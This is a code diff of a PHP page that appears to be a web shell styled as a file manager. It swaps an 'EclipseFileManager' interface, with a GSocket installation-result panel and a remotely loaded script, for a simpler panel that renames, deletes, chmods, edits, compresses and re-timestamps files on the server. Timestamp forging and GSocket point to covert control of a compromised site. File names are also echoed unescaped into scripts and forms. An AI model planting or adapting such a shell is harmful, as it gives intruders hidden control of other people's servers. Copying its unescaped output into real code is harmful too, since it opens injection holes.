+                        <button onclick="openTimestampModal('<?= $item ?>')">Timestamp</button>
+                        <button onclick="if(confirm('Are you sure?')) { document.getElementById('deleteForm<?= $item ?>').submit(); }">Delete</button>
+                        <button onclick="window.location.href='?path=<?= urlencode($current_path) ?>&download=<?= urlencode($item) ?>'">Download</button>
+                        <button onclick="if(confirm('Compress this folder?')) { document.getElementById('compressForm<?= $item ?>').submit(); }">Compress</button>
+                        <form id="deleteForm<?= $item ?>" action="" method="post" style="display:none;">
+                            <input type="hidden" name="target" value="<?= $item ?>">
+                            <input type="hidden" name="action" value="delete">
                         </form>
-                        <div id="chatFilePreview"></div>
-                        <div id="chatTyping" class="chat-typing" style="display: none;">
-                            <span>EclipseAI is typing</span>
-                            <div class="typing-dots">
-                                <div class="typing-dot"></div>
-                                <div class="typing-dot"></div>
-                                <div class="typing-dot"></div>
-                            </div>
-                        </div>
-                        <div id="chatError" class="chat-error" style="display: none;">
-                            <div class="chat-error-icon">
-                                <i class="fas fa-exclamation-circle"></i>
-                            </div>
-                            <div class="chat-error-text">An error occurred. Please try again.</div>
-                            <button class="chat-error-retry" id="chatRetry">Retry</button>
-                        </div>
-                    </div>
-                </div>
-                <?php elseif (isset($_GET['preview']) && !empty($_GET['preview'])): ?>
-                <?php
-                $preview_file = realpath($path . '/' . $_GET['preview']);
-                if (strpos($preview_file, $path) === 0 && is_file($preview_file) && isViewable(basename($preview_file))):
-                    $filename = basename($preview_file);
-                    $mime_type = getMimeType($filename);
-                    $file_ext = strtolower(pathinfo($filename, PATHINFO_EXTENSION));
-                ?>
-                <div class="preview-container">
-                    <div class="preview-header">
-                        <div class="preview-title">
-                            <i class="fas fa-eye"></i>
-                            <span>Previewing: <?php echo htmlspecialchars($filename); ?></span>
-                        </div>
-                        <div>
-                            <a href="<?php echo htmlspecialchars($preview_file); ?>" download class="btn btn-sm btn-primary">
-                                <i class="fas fa-download"></i>
-                                <span>Download</span>
-                            </a>
-                            <a href="?path=<?php echo urlencode($path); ?>&edit=<?php echo urlencode($filename); ?>" class="btn btn-sm btn-light">
-                                <i class="fas fa-edit"></i>
-                                <span>Edit</span>
-                            </a>
-                        </div>
-                    </div>
-                    <div class="preview-body">
-                        <?php if (in_array($file_ext, ['jpg', 'jpeg', 'png', 'gif', 'svg'])): ?>
-                        <img src="<?php echo htmlspecialchars($preview_file); ?>" alt="<?php echo htmlspecialchars($filename); ?>" class="preview-image">
-                        <?php elseif ($file_ext === 'pdf'): ?>
-                        <iframe src="<?php echo htmlspecialchars($preview_file); ?>" class="preview-pdf"></iframe>
+                        <form id="compressForm<?= $item ?>" action="" method="post" style="display:none;">
+                            <input type="hidden" name="target" value="<?= $item ?>">
+                            <input type="hidden" name="action" value="compress">
+                        </form>
+                    </td>
+                </tr>
+            <?php endforeach; ?>
+            <?php foreach ($files as $item): ?>
+                <?php $item_path = $current_path . '/' . $item; ?>
+                <tr>
+                    <td><?= $item ?></td>
+                    <td>File</td>
+                    <td><?= filesize($item_path) . ' bytes' ?></td>
+                    <td><?= substr(sprintf('%o', fileperms($item_path)), -4) ?></td>
+                    <td><?= posix_getpwuid(fileowner($item_path))['name'] . '/' . posix_getgrgid(filegroup($item_path))['name'] ?></td>
+                    <td><?= date("Y-m-d H:i:s", filemtime($item_path)) ?></td>
+                    <td>
+                        <button onclick="openRenameModal('<?= $item ?>')">Rename</button>
+                        <button onclick="openChmodModal('<?= $item ?>')">Chmod</button>
+                        <button onclick="openTimestampModal('<?= $item ?>')">Timestamp</button>
+                        <button onclick="openEditor('<?= $item ?>')">Edit</button>
+                        <button onclick="if(confirm('Are you sure?')) { document.getElementById('deleteForm<?= $item ?>').submit(); }">Delete</button>
+                        <button onclick="window.location.href='?path=<?= urlencode($current_path) ?>&download=<?= urlencode($item) ?>'">Download</button>
+                        <?php if (pathinfo($item_path, PATHINFO_EXTENSION) === 'zip'): ?>
+                            <button onclick="if(confirm('Uncompress this file?')) { document.getElementById('uncompressForm<?= $item ?>').submit(); }">Uncompress</button>
                         <?php else: ?>
-                        <pre class="preview-text"><?php echo htmlspecialchars(file_get_contents($preview_file)); ?></pre>
+                            <button onclick="if(confirm('Compress this file?')) { document.getElementById('compressForm<?= $item ?>').submit(); }">Compress</button>
                         <?php endif; ?>
-                    </div>
-                </div>
-                <?php endif; ?>
-                <?php else: ?>
-                <div class="action-buttons">
-                    <button class="btn btn-light" id="openNewFolderModalAction">
-                        <i class="fas fa-folder-plus"></i>
-                        <span>New Folder</span>
-                    </button>
-                    <button class="btn btn-light" id="openNewFileModalAction">
-                        <i class="fas fa-plus"></i>
-                        <i class="fas fa-file"></i>
-                        <span>New File</span>
-                    </button>
-                    <button class="btn btn-light" id="openUploadModalAction">
-                        <i class="fas fa-upload"></i>
-                        <span>Upload Files</span>
-                    </button>
-                    <button class="btn btn-light" id="refreshBtn">
-                        <i class="fas fa-sync-alt"></i>
-                        <span>Refresh</span>
-                    </button>
-                </div>
+                        <form id="deleteForm<?= $item ?>" action="" method="post" style="display:none;">
+                            <input type="hidden" name="target" value="<?= $item ?>">
+                            <input type="hidden" name="action" value="delete">
+                        </form>
+                        <form id="compressForm<?= $item ?>" action="" method="post" style="display:none;">
+                            <input type="hidden" name="target" value="<?= $item ?>">
+                            <input type="hidden" name="action" value="compress">
+                        </form>
+                        <form id="uncompressForm<?= $item ?>" action="" method="post" style="display:none;">
+                            <input type="hidden" name="target" value="<?= $item ?>">
+                            <input type="hidden" name="action" value="uncompress">
+                        </form>
+                    </td>
+                </tr>
+            <?php endforeach; ?>
+        </tbody>
+    </table>
 
-                <div class="file-list">
-                    <div class="file-list-header">
-                        <div>Name</div>
-                        <div>Size</div>
-                        <div>Permissions</div>
-                        <div>Actions</div>
-                    </div>
-                    <div class="file-list-body">
-                        <?php if ($path !== '/'): ?>
-                        <div class="file-item">
-                            <div class="file-name">
-                                <div class="file-icon folder">
-                                    <i class="fas fa-level-up-alt"></i>
-                                </div>
-                                <a href="?path=<?php echo urlencode(dirname($path)); ?>" class="file-link">..</a>
-                            </div>
-                            <div class="file-size">-</div>
-                            <div class="file-perm">-</div>
-                            <div class="file-actions">-</div>
-                        </div>
-                        <?php endif; ?>
+    <!-- Modals -->
+    <div id="renameModal" class="modal">
+        <h2>Rename</h2>
+        <form action="" method="post">
+            <input type="hidden" name="target" id="renameTarget">
+            <input type="text" name="new_name" placeholder="New Name" required>
+            <button type="submit" name="action" value="rename">Rename</button>
+            <button type="button" onclick="closeModal('renameModal')">Cancel</button>
+        </form>
+    </div>
 
-                        <?php
-                        $items = scandir($path);
-                        $folders = [];
-                        $files = [];
-                        
-                        foreach ($items as $item) {
-                            if ($item === '.' || $item === '..') continue;
-                            
-                            $fullPath = $path . '/' . $item;
-                            if (is_dir($fullPath)) {
-                                $folders[] = $item;
-                            } else {
-                                $files[] = $item;
-                            }
-                        }
-                        sort($folders);
-                        sort($files);
-                        foreach ($folders as $folder) {
-                            $fullPath = $path . '/' . $folder;
-                            ?>
-                            <div class="file-item">
-                                <div class="file-name">
-                                    <div class="file-icon folder">
-                                        <i class="fas fa-folder"></i>
-                                    </div>
-                                    <a href="?path=<?php echo urlencode($fullPath); ?>" class="file-link"><?php echo htmlspecialchars($folder); ?></a>
-                                </div>
-                                <div class="file-size">-</div>
-                                <div class="file-perm"><?php echo formatPermissions($fullPath); ?></div>
-                                <div class="file-actions">
-                                    <button class="btn btn-sm btn-outline rename-btn" data-name="<?php echo htmlspecialchars($folder); ?>">
-                                        <i class="fas fa-edit"></i>
-                                    </button>
-                                    <button class="btn btn-sm btn-outline delete-btn" data-name="<?php echo htmlspecialchars($folder); ?>" data-path="?path=<?php echo urlencode($path); ?>&delete=<?php echo urlencode($folder); ?>">
-                                        <i class="fas fa-trash"></i>
-                                    </button>
-                                    <button class="btn btn-sm btn-outline chmod-btn" data-name="<?php echo htmlspecialchars($folder); ?>" data-path="<?php echo htmlspecialchars($fullPath); ?>">
-                                        <i class="fas fa-key"></i>
-                                    </button>
-                                </div>
-                            </div>
-                            <?php
-                        }
-                        foreach ($files as $file) {
-                            $fullPath = $path . '/' . $file;
-                            $fileSize = filesize($fullPath);
-                            $fileIcon = getFileIcon($file);
-                            ?>
-                            <div class="file-item">
-                                <div class="file-name">
-                                    <div class="file-icon <?php echo $fileIcon; ?>">
-                                        <i class="fas fa-<?php echo $fileIcon === 'folder' ? 'folder' : 'file'; ?>"></i>
-                                    </div>
-                                    <?php if (isViewable($file)): ?>
-                                    <a href="?path=<?php echo urlencode($path); ?>&preview=<?php echo urlencode($file); ?>" class="file-link"><?php echo htmlspecialchars($file); ?></a>
-                                    <?php else: ?>
-                                    <a href="?path=<?php echo urlencode($path); ?>&edit=<?php echo urlencode($file); ?>" class="file-link"><?php echo htmlspecialchars($file); ?></a>
-                                    <?php endif; ?>
-                                </div>
-                                <div class="file-size"><?php echo formatSize($fileSize); ?></div>
-                                <div class="file-perm"><?php echo formatPermissions($fullPath); ?></div>
-                                <div class="file-actions">
-                                    <button class="btn btn-sm btn-outline rename-btn" data-name="<?php echo htmlspecialchars($file); ?>">
-                                        <i class="fas fa-edit"></i>
-                                    </button>
-                                    <a href="?path=<?php echo urlencode($path); ?>&edit=<?php echo urlencode($file); ?>" class="btn btn-sm btn-outline">
-                                        <i class="fas fa-code"></i>
-                                    </a>
-                                    <a href="<?php echo htmlspecialchars($fullPath); ?>" download class="btn btn-sm btn-outline">
-                                        <i class="fas fa-download"></i>
-                                    </a>
-                                    <button class="btn btn-sm btn-outline delete-btn" data-name="<?php echo htmlspecialchars($file); ?>" data-path="?path=<?php echo urlencode($path); ?>&delete=<?php echo urlencode($file); ?>">
-                                        <i class="fas fa-trash"></i>
-                                    </button>
-                                    <button class="btn btn-sm btn-outline chmod-btn" data-name="<?php echo htmlspecialchars($file); ?>" data-path="<?php echo htmlspecialchars($fullPath); ?>">
-                                        <i class="fas fa-key"></i>
-                                    </button>
-                                </div>
-                            </div>
-                            <?php
-                        }
-                        
-                        if (empty($folders) && empty($files)) {
-                            echo '<div class="text-center p-3 text-muted">This folder is empty</div>';
-                        }
-                        ?>
-                    </div>
-                </div>
-                <?php if (isset($_GET['edit'])): ?>
-                <?php
-                $edit = realpath($path . '/' . $_GET['edit']);
-                if (strpos($edit, $path) === 0 && is_file($edit)):
-                    $content = htmlspecialchars(file_get_contents($edit));
-                    $filename = basename($edit);
-                    $extension = strtolower(pathinfo($filename, PATHINFO_EXTENSION));
-                    $editorMode = getEditorMode($filename);
-                ?>
-                <div class="card mt-4" style="margin-bottom: 0;" id="editorCard">
-                    <div class="card-header">
-                        <div>Editing: <?php echo htmlspecialchars($filename); ?></div>
-                        <div>
-                            <button class="btn btn-sm btn-light toggle-theme-btn">
-                                <i class="fas fa-moon"></i>
-                                <span>Toggle Theme</span>
-                            </button>
-                            <button class="btn btn-sm btn-light fullscreen-toggle">
-                                <i class="fas fa-expand"></i>
-                                <span>Fullscreen</span>
-                            </button>
-                        </div>
-                    </div>
-                    <div class="card-body p-0">
-                        <div class="editor-container">
-                            <form method="post">
-                                <div class="editor-body">
-                                    <textarea name="content" id="codeEditor" data-mode="<?php echo $editorMode; ?>"><?php echo $content; ?></textarea>
-                                </div>
-                                <div class="editor-footer">
-                                    <div class="text-xs text-muted mt-2">
-                                        Shortcuts: <kbd>Ctrl+S</kbd> Save, <kbd>Ctrl+F</kbd> Find, <kbd>Ctrl+Space</kbd> Autocomplete, <kbd>F11</kbd> Fullscreen
-                                    </div>
-                                    <input type="hidden" name="save_file" value="<?php echo htmlspecialchars(basename($edit)); ?>">
-                                    <button type="submit" class="btn btn-primary">
-                                        <i class="fas fa-save"></i>
-                                        <span>Save Changes</span>
-                                    </button>
-                                </div>
-                            </form>
-                        </div>
-                    </div>
-                </div>
-                <?php endif; endif; ?>
-                <?php endif; ?>
-            </div>
-        </main>
+    <div id="chmodModal" class="modal">
+        <h2>Change Permissions</h2>
+        <form action="" method="post">
+            <input type="hidden" name="target" id="chmodTarget">
+            <input type="text" name="mode" placeholder="e.g., 755" required>
+            <button type="submit" name="action" value="chmod">Change</button>
+            <button type="button" onclick="closeModal('chmodModal')">Cancel</button>
+        </form>
     </div>
-    <div class="modal-backdrop" id="uploadModal">
-        <div class="modal">
-            <div class="modal-header">
-                <div class="modal-title">Upload Files</div>
-                <button class="modal-close" data-dismiss="modal">
-                    <i class="fas fa-times"></i>
-                </button>
-            </div>
-            <div class="modal-body">
-                <form method="post" enctype="multipart/form-data" id="uploadForm">
-                    <div class="dropzone" id="dropzone">
-                        <div class="dropzone-icon">
-                            <i class="fas fa-cloud-upload-alt"></i>
-                        </div>
-                        <div class="dropzone-text">Drag & drop files here or click to browse</div>
-                        <div class="dropzone-hint">Maximum file size: 10MB</div>
-                        <input type="file" name="upload[]" id="fileInput" style="display: none;" multiple>
-                    </div>
-                    <div id="selectedFiles" class="mt-4" style="display: none;">
-                        <div class="file-list-preview">
-                            <div class="file-list-preview-header">Selected Files</div>
-                            <div class="file-list-preview-body" id="filePreviewList"></div>
-                        </div>
-                    </div>
-                </form>
-            </div>
-            <div class="modal-footer">
-                <button class="btn btn-light" data-dismiss="modal">Cancel</button>
-                <button class="btn btn-primary" id="submitUpload">Upload</button>
-            </div>
-        </div>
+
+    <div id="timestampModal" class="modal">
+        <h2>Change Timestamp</h2>
+        <form action="" method="post">
+            <input type="hidden" name="target" id="timestampTarget">
+            <input type="datetime-local" name="timestamp" required>
+            <button type="submit" name="action" value="touch">Change</button>
+            <button type="button" onclick="closeModal('timestampModal')">Cancel</button>
+        </form>
     </div>
-    <div class="modal-backdrop" id="newFolderModal">
-        <div class="modal">
-            <div class="modal-header">
-                <div class="modal-title">Create New Folder</div>
-                <button class="modal-close" data-dismiss="modal">
-                    <i class="fas fa-times"></i>
-                </button>
-            </div>
-            <div class="modal-body">
-                <form method="post" id="newFolderForm">
-                    <div class="form-group">
-                        <label for="folderName" class="form-label">Folder Name</label>
-                        <input type="text" name="new_folder" id="folderName" class="form-control" placeholder="Enter folder name" required>
-                    </div>
-                </form>
-            </div>
-            <div class="modal-footer">
-                <button class="btn btn-light" data-dismiss="modal">Cancel</button>
-                <button class="btn btn-primary" id="submitNewFolder">Create</button>
-            </div>
-        </div>
+
+    <div id="editorModal" class="modal">
+        <h2>Edit File</h2>
+        <form action="" method="post">
+    <input type="hidden" name="target" id="editTarget">
+    <textarea name="file_content" id="fileContent"></textarea><br>
+    <button type="submit" name="action" value="edit_file">Save</button>
+    <button type="button" onclick="closeModal('editorModal')">Cancel</button>
+</form>
     </div>
-    <div class="modal-backdrop" id="newFileModal">
-        <div class="modal">
-            <div class="modal-header">
-                <div class="modal-title">Create New File</div>
-                <button class="modal-close" data-dismiss="modal">
-                    <i class="fas fa-times"></i>
-                </button>
-            </div>
-            <div class="modal-body">
-                <form method="post" id="newFileForm">
-                    <div class="form-group">
-                        <label for="fileName" class="form-label">File Name</label>
-                        <input type="text" name="new_file" id="fileName" class="form-control" placeholder="Enter file name" required>
-                    </div>
-                </form>
-            </div>
-            <div class="modal-footer">
-                <button class="btn btn-light" data-dismiss="modal">Cancel</button>
-                <button class="btn btn-primary" id="submitNewFile">Create</button>
-            </div>
-        </div>
-    </div>
-    <div class="modal-backdrop" id="renameModal">
-        <div class="modal">
-            <div class="modal-header">
-                <div class="modal-title">Rename Item</div>
-                <button class="modal-close" data-dismiss="modal">
-                    <i class="fas fa-times"></i>
-                </button>
-            </div>
-            <div class="modal-body">
-                <form method="post" id="renameForm">
-                    <div class="form-group">
-                        <label for="newName" class="form-label">New Name</label>
-                        <input type="hidden" name="rename_from" id="renameFrom">
-                        <input type="text" name="rename_to" id="newName" class="form-control" placeholder="Enter new name" required>
-                    </div>
-                </form>
-            </div>
-            <div class="modal-footer">
-                <button class="btn btn-light" data-dismiss="modal">Cancel</button>
-                <button class="btn btn-primary" id="submitRename">Create</button>
-            </div>
-        </div>
-    </div>
-    <div class="modal-backdrop" id="deleteModal">
-        <div class="modal">
-            <div class="modal-header">
-                <div class="modal-title">Confirm Delete</div>
-                <button class="modal-close" data-dismiss="modal">
-                    <i class="fas fa-times"></i>
-                </button>
-            </div>
-            <div class="modal-body">
-                <p>Are you sure you want to delete <strong id="deleteItemName"></strong>?</p>
-                <p class="text-danger">This action cannot be undone.</p>
-            </div>
-            <div class="modal-footer">
-                <button class="btn btn-light" data-dismiss="modal">Cancel</button>
-                <a href="#" class="btn btn-danger" id="confirmDelete">Delete</a>
-            </div>
-        </div>
-    </div>
-<div class="modal-backdrop" id="chmodModal">
-    <div class="modal">
-        <div class="modal-header">
-            <div class="modal-title">Change Permissions</div>
-            <button class="modal-close" data-dismiss="modal">
-                <i class="fas fa-times"></i>
-            </button>
-        </div>
-        <div class="modal-body">
-            <form method="post" id="chmodForm">
-                <p>Changing permissions for: <strong id="chmodItemName"></strong></p>
-                <div class="form-group mb-4">
-                    <input type="text" id="directPermValue" name="chmod_value" class="form-control" placeholder="e.g. 644, 755" maxlength="4">
-                    <small class="text-muted">Input permission number directly (e.g. 755, 644)</small>
-                </div>
-                
-                <input type="hidden" name="chmod_path" id="chmodPath">
-            </form>
-        </div>
-        <div class="modal-footer">
-            <button class="btn btn-light" data-dismiss="modal">Cancel</button>
-            <button class="btn btn-primary" id="submitChmod">Apply</button>
-        </div>
-    </div>
-</div>
-    <?php if (isset($_GET['gsocket_installed']) && isset($_SESSION['gsocket_output'])): ?>
-    <div class="modal-backdrop show" id="gsocketOutputModal">
-        <div class="modal" style="max-width: 700px;">
-            <div class="modal-header">
-                <div class="modal-title">GSocket Installation Result</div>
-                <button class="modal-close" data-dismiss="modal">
-                    <i class="fas fa-times"></i>
-                </button>
-            </div>
-            <div class="modal-body">
-                <div class="terminal-output">
-<?php foreach ($_SESSION['gsocket_output'] as $line): ?>
-<?php 
-    $class = '';
-    if (stripos($line, 'error') !== false) {
-        $class = 'error';
-    } elseif (stripos($line, 'warning') !== false) {
-        $class = 'warning';
-    } elseif (stripos($line, 'success') !== false || stripos($line, 'installed') !== false) {
-        $class = 'success';
-    } elseif (stripos($line, 'info') !== false) {
-        $class = 'info';
-    }
-?>
-<div class="<?php echo $class; ?>"><?php echo htmlspecialchars($line); ?></div>
-<?php endforeach; ?>
-                </div>
-                
-                <div class="mt-4">
-                    <p>Installation Status: 
-                        <?php if ($_SESSION['gsocket_status'] === 0): ?>
-                        <span class="perm-writable">Success</span>
-                        <?php else: ?>
-                        <span class="perm-not-writable">Failed (Code: <?php echo $_SESSION['gsocket_status']; ?>)</span>
-                        <?php endif; ?>
-                    </p>
-                </div>
-            </div>
-            <div class="modal-footer">
-                <button class="btn btn-primary" data-dismiss="modal">Close</button>
-            </div>
-        </div>
-    </div>
-    <?php 
-        unset($_SESSION['gsocket_output']);
-        unset($_SESSION['gsocket_status']);
-    endif; 
-    ?>
-    <script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.2/codemirror.min.js"></script>
-    <script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.2/mode/htmlmixed/htmlmixed.min.js"></script>
-    <script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.2/mode/xml/xml.min.js"></script>
-    <script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.2/mode/javascript/javascript.min.js"></script>
-    <script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.2/mode/css/css.min.js"></script>
-    <script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.2/mode/php/php.min.js"></script>
-    <script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.2/mode/clike/clike.min.js"></script>
-    <script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.2/mode/markdown/markdown.min.js"></script>
-    <script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.2/mode/sql/sql.min.js"></script>
-    <script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.2/mode/python/python.min.js"></script>
-    <script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.2/mode/yaml/yaml.min.js"></script>
-    <script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.2/addon/edit/matchbrackets.min.js"></script>
-    <script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.2/addon/edit/closebrackets.min.js"></script>
-    <script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.2/addon/edit/closetag.min.js"></script>
-    <script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.2/addon/fold/foldcode.min.js"></script>
-    <script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.2/addon/fold/foldgutter.min.js"></script>
-    <script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.2/addon/fold/brace-fold.min.js"></script>
-    <script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.2/addon/fold/xml-fold.min.js"></script>
-    <script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.2/addon/fold/comment-fold.min.js"></script>
-    <script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.2/addon/fold/indent-fold.min.js"></script>
-    <script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.2/addon/fold/markdown-fold.min.js"></script>
-    <script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.2/addon/display/autorefresh.min.js"></script>
-    <script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.2/addon/search/search.min.js"></script>
-    <script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.2/addon/search/searchcursor.min.js"></script>
-    <script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.2/addon/search/jump-to-line.min.js"></script>
-    <script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.2/addon/dialog/dialog.min.js"></script>
-    <script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.2/addon/hint/show-hint.min.js"></script>
-    <script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.2/addon/hint/xml-hint.min.js"></script>
-    <script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.2/addon/hint/html-hint.min.js"></script>
-    <script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.2/addon/hint/css-hint.min.js"></script>
-    <script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.2/addon/hint/javascript-hint.min.js"></script>
-    <script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.2/addon/hint/sql-hint.min.js"></script>
-    <script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.2/addon/selection/active-line.min.js"></script>
+
     <script>
-        const PHP_CHAT_SESSION_ID = '<?php echo $_SESSION['chat_session_id']; ?>';
+        function openRenameModal(target) {
+            document.getElementById('renameTarget').value = target;
+            document.getElementById('renameModal').style.display = 'block';
+        }
+
+        function openChmodModal(target) {
+            document.getElementById('chmodTarget').value = target;
+            document.getElementById('chmodModal').style.display = 'block';
+        }
+
+        function openTimestampModal(target) {
+            document.getElementById('timestampTarget').value = target;
+            document.getElementById('timestampModal').style.display = 'block';
+        }
+
+        function openEditor(file) {
+            document.getElementById('editTarget').value = file;
+            fetch('?path=<?= urlencode($current_path) ?>&file=' + file + '&raw=true')
+            .then(response => response.text())
+            .then(data => {
+            document.getElementById('fileContent').value = data;
+            document.getElementById('editorModal').style.display = 'block';
+        });
+}
+
+        function closeModal(modalId) {
+            document.getElementById(modalId).style.display = 'none';
+        }
     </script>
-<script src="https://cdn.jsdelivr.net/gh/eclibesec/EclipseFileManager@main/script.js"></script>
 </body>
 </html>
-<?php endif; ?>
